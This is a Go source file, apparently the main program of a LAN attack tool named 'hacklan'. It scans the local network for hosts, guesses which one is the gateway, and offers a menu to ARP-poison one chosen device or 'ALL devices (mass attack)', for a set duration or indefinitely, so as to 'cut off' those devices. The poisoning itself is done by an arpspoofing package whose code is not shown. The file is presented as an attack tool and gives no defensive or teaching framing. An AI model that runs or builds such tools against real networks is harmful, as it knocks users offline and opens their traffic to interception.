package main

import (
	"bufio"
	"fmt"
	"hacklan/arpspoofing"
	"net"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func main() {
	fmt.Println("=== Network Scanner & ARP Poisoner ===")
	fmt.Println()

	// Scan the network
	hosts, iface, myIP, err := arpspoofing.ScanNetwork()
	if err != nil {
		fmt.Printf("Error scanning network: %v\n", err)
		os.Exit(1)
	}

	if len(hosts) == 0 {
		fmt.Println("No hosts found on the network.")
		os.Exit(0)
	}

	// Sort hosts by IP for consistent display
	sort.Slice(hosts, func(i, j int) bool {
		return compareIPs(hosts[i].IP, hosts[j].IP)
	})

	// Display hosts with numbers
	fmt.Println("\n=== Discovered Hosts ===")
	for i, host := range hosts {
		marker := ""
		if host.IP.Equal(myIP) {
			marker = " (this machine)"
		} else if isLikelyGateway(host.IP) {
			marker = " (likely gateway)"
		}
		fmt.Printf("%2d. %-15s  %s%s\n", i+1, host.IP, host.MAC, marker)
	}

	// Find gateway first
	gateway := findGateway(hosts)
	if gateway == nil {
		fmt.Println("Could not identify gateway. Using .1 address...")
		// Fallback: assume .1 is the gateway
		if len(hosts) > 0 {
			gatewayIP := make(net.IP, len(hosts[0].IP))
			copy(gatewayIP, hosts[0].IP)
			gatewayIP[3] = 1

			// Find the gateway in hosts
			for _, h := range hosts {
				if h.IP.Equal(gatewayIP) {
					gateway = &h
					break
				}
			}
		}

		if gateway == nil {
			fmt.Println("Gateway not found in discovered hosts!")
			os.Exit(1)
		}
	}

	// Ask user to select target or poison all
	fmt.Println("\n=== ARP Poisoning Menu ===")
	fmt.Printf("%2d. Poison ALL devices (mass attack)\n", len(hosts)+1)
	targetIdx := promptInt("Enter device number to cut off, or select 'ALL' option (0 to exit): ", 0, len(hosts)+1)
	if targetIdx == 0 {
		fmt.Println("Exiting.")
		os.Exit(0)
	}

	// Ask for duration
	durationSecs := promptInt("\nEnter duration in seconds (0 for indefinite): ", 0, 86400)
	var duration time.Duration
	if durationSecs > 0 {
		duration = time.Duration(durationSecs) * time.Second
	}

	// Set up signal handling for Ctrl+C
	stopChan := make(chan struct{})
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n[*] Interrupt received, stopping...")
		close(stopChan)
	}()

	// Check if user selected "poison all"
	if targetIdx == len(hosts)+1 {
		// Poison all devices
		fmt.Printf("\n⚠️  WARNING: About to poison ALL %d devices on the network!\n", len(hosts)-2)
		fmt.Print("Type 'YES' to confirm: ")
		reader := bufio.NewReader(os.Stdin)
		confirm, _ := reader.ReadString('\n')
		confirm = strings.TrimSpace(confirm)

		if confirm != "YES" {
			fmt.Println("Attack cancelled.")
			os.Exit(0)
		}

		err = arpspoofing.PoisonAllDevices(hosts, gateway.IP, gateway.MAC, myIP, iface, duration, stopChan)
		if err != nil {
			fmt.Printf("Error during mass poisoning: %v\n", err)
			os.Exit(1)
		}
	} else {
		// Poison single device
		target := hosts[targetIdx-1]

		// Don't allow attacking yourself
		if target.IP.Equal(myIP) {
			fmt.Println("Cannot target your own machine!")
			os.Exit(1)
		}

		// Don't allow attacking the gateway
		if target.IP.Equal(gateway.IP) {
			fmt.Println("Cannot target the gateway!")
			os.Exit(1)
		}

		fmt.Printf("\nTarget: %s (%s)\n", target.IP, target.MAC)
		fmt.Printf("Gateway: %s (%s)\n", gateway.IP, gateway.MAC)

		err = arpspoofing.PoisonDevice(target.IP, gateway.IP, target.MAC, gateway.MAC, iface, duration, stopChan)
		if err != nil {
			fmt.Printf("Error during poisoning: %v\n", err)
			os.Exit(1)
		}
	}

	fmt.Println("[*] Attack completed.")
}

// promptInt prompts for an integer within a range
func promptInt(prompt string, min, max int) int {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(prompt)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		val, err := strconv.Atoi(input)
		if err != nil {
			fmt.Printf("Invalid number. Please try again.\n")
			continue
		}

		if val < min || val > max {
			fmt.Printf("Please enter a number between %d and %d.\n", min, max)
			continue
		}

		return val
	}
}

// compareIPs compares two IPs for sorting
func compareIPs(a, b net.IP) bool {
	a4 := a.To4()
	b4 := b.To4()
	if a4 == nil || b4 == nil {
		return false
	}
	for i := 0; i < 4; i++ {
		if a4[i] != b4[i] {
			return a4[i] < b4[i]
		}
	}
	return false
}

// isLikelyGateway checks if an IP is likely the gateway (ends in .1)
func isLikelyGateway(ip net.IP) bool {
	ip4 := ip.To4()
	return ip4 != nil && ip4[3] == 1
}

// findGateway attempts to find the gateway in the host list
func findGateway(hosts []arpspoofing.Host) *arpspoofing.Host {
	for i := range hosts {
		if isLikelyGateway(hosts[i].IP) {
			return &hosts[i]
		}
	}
	return nil
}
